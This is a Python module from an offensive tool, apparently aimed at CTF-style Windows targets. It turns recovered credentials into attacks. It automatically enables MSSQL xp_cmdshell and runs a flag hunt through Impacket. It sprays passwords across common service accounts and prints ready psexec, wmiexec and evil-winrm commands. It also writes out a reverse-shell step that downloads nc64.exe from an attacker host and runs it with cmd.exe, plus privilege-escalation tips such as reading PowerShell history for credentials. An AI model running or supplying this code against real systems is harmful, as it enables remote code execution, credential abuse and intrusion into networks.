"""Windows post-credential attacks (opt-in, --exploit).

Once scryer recovers a credential (from a looted SMB share, a config file, a
cracked hash) on a Windows target, this turns it into action:

  * MSSQL (1433): if the account is sysadmin, enable xp_cmdshell and run a
    flag-hunt through Impacket's mssqlclient (best-effort; needs impacket), and
    always print the exact command sequence.
  * SMB/WinRM (445/5985): print ready netexec spray + Impacket psexec/wmiexec +
    evil-winrm commands with the recovered creds.
  * Windows privesc methodology: PowerShell history, SeImpersonate -> potato.

The auto-run pieces are best-effort and Windows-target-specific; the printed
commands are the reliable deliverable.
"""

from __future__ import annotations

import os
import re
import tempfile
from typing import List, Tuple

from ...core import utils, tooling
from ...core.report import HostReport, Finding

_COMMON_USERS = ["sql_svc", "sa", "administrator", "admin", "svc_sql",
                 "mssql", "sqlserver"]
# One-liner that finds any flag under C:\Users no matter the account.
_PS_FLAGHUNT = ("powershell -c \"Get-ChildItem C:\\Users\\ -Recurse -Include "
                "user.txt,root.txt -ErrorAction SilentlyContinue | "
                "ForEach-Object { Write-Output ('==='+$_.FullName); "
                "Get-Content $_.FullName }\"")


def run(host: HostReport, opts) -> None:
    if not getattr(opts, "exploit", False):
        return
    ports = {e["port"] for e in host.open_ports}
    windows = bool({135, 139, 445, 1433, 3389, 5985} & ports) or \
        (host.os_guess and "windows" in host.os_guess.lower())
    if not windows:
        return
    pairs = _cred_pairs(host)
    if not pairs:
        return
    domain = _domain(host)
    ip = host.resolved_ip
    utils.section(f"WINDOWS ATTACK {ip}")

    if 1433 in ports:
        # One clear finding with the command, then attempt each pair quietly.
        u0, p0 = pairs[0]
        host.add(Finding(
            title="MSSQL: try xp_cmdshell RCE with recovered creds",
            detail=f"impacket-mssqlclient {domain}/{u0}:'{p0}'@{ip} -windows-auth\n"
                   "Then: enable_xp_cmdshell; xp_cmdshell whoami. sysadmin -> RCE. "
                   "scryer auto-attempts every recovered cred when impacket is "
                   "installed.",
            severity="high", category="access", port=1433, service="mssql",
            evidence=f"{u0}:{p0}"))
        client = tooling.resolve("impacket-mssqlclient") or tooling.resolve("mssqlclient.py")
        if not client:
            utils.log("dim", "impacket-mssqlclient not installed — run the printed "
                             "command by hand", indent=1)
        else:
            for user, pw in pairs:
                if _mssql(host, ip, domain, user, pw, client):
                    break

    _spray_and_shells(host, ip, domain, ports, pairs)
    _privesc_notes(host, ip)


# --- MSSQL ------------------------------------------------------------------
def _mssql(host, ip, domain, user, pw, client) -> bool:
    cmd_tpl = (f"impacket-mssqlclient {domain}/{user}:'{pw}'@{ip} -windows-auth")
    script = ("EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
              "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
              "EXEC xp_cmdshell 'whoami';\n"
              f"EXEC xp_cmdshell '{_PS_FLAGHUNT}';\n")
    sf = os.path.join(tempfile.gettempdir(), f"scryer_mssql_{user}.sql")
    try:
        with open(sf, "w") as fh:
            fh.write(script)
    except OSError:
        return False
    # Try with and without the DOMAIN/ prefix.
    for target in (f"{domain}/{user}:{pw}@{ip}", f"{user}:{pw}@{ip}"):
        utils.log("info", f"mssqlclient {user}@{ip} (xp_cmdshell)...", indent=1)
        rc, out, _ = utils.run([client, target, "-windows-auth", "-file", sf],
                               timeout=120)
        blob = out or ""
        if "Login failed" in blob or "STATUS_LOGON_FAILURE" in blob or not blob.strip():
            continue
        if "nt authority" in blob.lower() or "\\" in blob or "xp_cmdshell" in blob.lower():
            utils.log("hot", f"MSSQL xp_cmdshell RCE as {user}", indent=1)
            host.add(Finding(
                title=f"RCE via MSSQL xp_cmdshell ({user})",
                detail=f"sysadmin + xp_cmdshell enabled. {cmd_tpl}",
                severity="critical", category="access", port=1433,
                service="mssql", evidence=cmd_tpl))
        got = _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})")
        # Reverse shell next-step (nc64) for an interactive foothold.
        host.add(Finding(
            title="MSSQL -> reverse shell (next step)",
            detail="Stage a shell: on your box `python3 -m http.server 80` + "
                   "`nc -lvnp 443`, then in the SQL shell:\n"
                   "xp_cmdshell \"powershell -c cd C:\\Users\\Public; wget "
                   "http://<LHOST>/nc64.exe -outfile nc64.exe; "
                   ".\\nc64.exe -e cmd.exe <LHOST> 443\"",
            severity="info", category="access", port=1433, service="mssql",
            confidence="potential"))
        return got or True
    return False


# --- SMB / WinRM spray + shells --------------------------------------------
def _spray_and_shells(host, ip, domain, ports, pairs) -> None:
    lines = []
    for user, pw in pairs[:6]:
        d = f"{domain}/" if domain and domain != "." else ""
        if {139, 445} & ports:
            lines.append(f"netexec smb {ip} -u '{user}' -p '{pw}'"
                         + (f" -d {domain}" if domain and domain != "." else "")
                         + " --shares")
            lines.append(f"impacket-psexec {d}{user}:'{pw}'@{ip}    # SYSTEM if admin")
            lines.append(f"impacket-wmiexec {d}{user}:'{pw}'@{ip}")
        if 5985 in ports:
            lines.append(f"netexec winrm {ip} -u '{user}' -p '{pw}'"
                         + (f" -d {domain}" if domain and domain != "." else ""))
            lines.append(f"evil-winrm -i {ip} -u '{user}' -p '{pw}'")
    if not lines:
        return
    utils.log("hot", f"{len(pairs)} Windows credential(s) — spray + get a shell",
              indent=1)
    host.add(Finding(
        title=f"Windows credential reuse — spray {len(pairs)} cred(s)",
        detail="Recovered: " + ", ".join(f"{u}:{p}" for u, p in pairs[:8])
               + "\n\n" + "\n".join(dict.fromkeys(lines)),
        severity="high", category="access", confidence="potential",
        evidence="\n".join(f"{u}:{p}" for u, p in pairs)))


def _privesc_notes(host, ip) -> None:
    host.add(Finding(
        title="Windows privesc checklist (after a shell)",
        detail="1) `whoami /priv` — SeImpersonate/SeAssignPrimaryToken -> "
               "PrintSpoofer/GodPotato -> SYSTEM.\n"
               "2) PowerShell history often has creds:\n"
               "   type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\"
               "ConsoleHost_history.txt\n"
               "3) winPEAS / cmdkey /list / unattend.xml / saved RDP creds.\n"
               "4) Found an admin password? impacket-psexec administrator:'<pw>'@"
               f"{ip}  (or evil-winrm). See notes/windows-privesc.md.",
        severity="info", category="access", confidence="potential"))


# --- helpers ---------------------------------------------------------------
def _harvest_flags(host, blob, source) -> bool:
    from ...data import knowledge
    got = False
    for tok in knowledge.find_flags(blob or ""):
        got = True
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG ({source})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(title=f"FLAG via {source}", detail=tok,
                         severity="critical", category="flag", service="mssql",
                         evidence=f"{source}: {tok}"))
    return got


def _cred_pairs(host: HostReport) -> List[Tuple[str, str]]:
    """(username, password) pairs from cred findings, plus each recovered
    password paired with common Windows service usernames."""
    pairs, seen = [], set()

    def add(u, p):
        u = (u or "").split("\\")[-1]
        if p and (u, p) not in seen:
            seen.add((u, p))
            pairs.append((u, p))

    for f in host.findings:
        if f.category == "cred" and f.evidence and ":" in f.evidence:
            m = re.search(r"([A-Za-z0-9._\\-]+):([^\s]+)$", f.evidence.strip())
            if m:
                add(m.group(1), m.group(2))
    # Every recovered password x common usernames (covers sql_svc etc.).
    for pw in host.creds:
        for u in _COMMON_USERS:
            add(u, pw)
    return pairs


def _domain(host: HostReport) -> str:
    for n in host.hostnames:
        nl = n.lower()
        if "." in nl and not _is_ip(nl):
            return nl.split(".")[0]
        if nl and not _is_ip(nl):
            return nl
    return "."


def _is_ip(name: str) -> bool:
    parts = name.split(".")
    return len(parts) == 4 and all(p.isdigit() for p in parts)
